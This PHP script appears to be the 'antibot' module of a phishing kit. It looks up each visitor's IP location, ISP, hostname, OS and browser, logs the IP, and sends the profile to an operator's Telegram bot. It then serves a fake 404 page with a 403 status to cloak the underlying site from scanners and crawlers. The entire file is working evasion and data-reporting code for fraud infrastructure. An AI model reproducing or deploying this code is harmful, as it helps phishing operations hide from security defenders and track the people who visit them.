<?php
$tanitatikaram = parse_ini_file("./config.ini", true);
$Token = $tanitatikaram['Token'];
$ChatID = $tanitatikaram['ChatID'];
$ip = getenv("REMOTE_ADDR");
$url = "http://ip-api.com/json/" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countryname = $details['country'];
$city = $details['city'];
$isp = $details['isp'];
$region = $details['regionName'];
$asn = $details['as'];
function getOS($useragent)
{
    $os_platform = "Unknown OS Platform";
    $os_array = array('/windows nt 10/i' => 'Windows 10', '/windows nt 6.3/i' => 'Windows 8.1', '/windows nt 6.2/i' => 'Windows 8', '/windows nt 6.1/i' => 'Windows 7', '/windows nt 6.0/i' => 'Windows Vista', '/windows nt 5.2/i' => 'Windows Server 2003/XP x64', '/windows nt 5.1/i' => 'Windows XP', '/windows xp/i' => 'Windows XP', '/windows nt 5.0/i' => 'Windows 2000', '/windows me/i' => 'Windows ME', '/win98/i' => 'Windows 98', '/win95/i' => 'Windows 95', '/win16/i' => 'Windows 3.11', '/macintosh|mac os x/i' => 'Mac OS X', '/mac_powerpc/i' => 'Mac OS 9', '/linux/i' => 'Linux', '/ubuntu/i' => 'Ubuntu', '/iphone/i' => 'iPhone', '/ipod/i' => 'iPod', '/ipad/i' => 'iPad', '/android/i' => 'Android', '/blackberry/i' => 'BlackBerry', '/webos/i' => 'Mobile');
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $os_platform = $value;
        }
    }
    return $os_platform;
}
function getBrowser($useragent)
{
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer', '/firefox/i' => 'Firefox', '/safari/i' => 'Safari', '/chrome/i' => 'Chrome', '/opera/i' => 'Opera', '/netscape/i' => 'Netscape', '/maxthon/i' => 'Maxthon', '/konqueror/i' => 'Konqueror', '/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser = $value;
        }
    }
    return $browser;
}
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = getOS($useragent);
$browser = getBrowser($useragent);
$body .= " V6 | REASON:Isp | CODE:75990\n";
$body .= "Antibot Copyright @mac_Hemsworth\n\n";
$body .= "IP Address:{$ip}" . "\n";
$body .= "COUNTRY:{$countryname}" . "\n";
$body .= "REGION:{$region}" . "\n";
$body .= "ORGANISATION:{$isp}" . "\n";
$body .= "ASN:{$asn}" . "\n";
$body .= "HOSTNAME:" . $hostname . "" . "\n";
$body .= "OS:{$os}" . "\n";
$body .= "BROWSER:{$browser}" . "\n" . "\n";
$body .= "USER AGENT:{$_SERVER['HTTP_USER_AGENT']}" . "\n";
function callAPI($url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($curl);
    curl_close($curl);
}
$click = fopen("./logarithm/total_bot.txt", "a");
fwrite($click, "{$ip}|Isp " . "\n");
fclose($click);
$result = urlencode($body);
callAPI('https://api.telegram.org/bot' . $Token . '/sendMessage?chat_id=' . $ChatID . '&text=' . $result . "&parse_mode=html");
header('HTTP/1.0 403 Forbidden');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this 404 server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');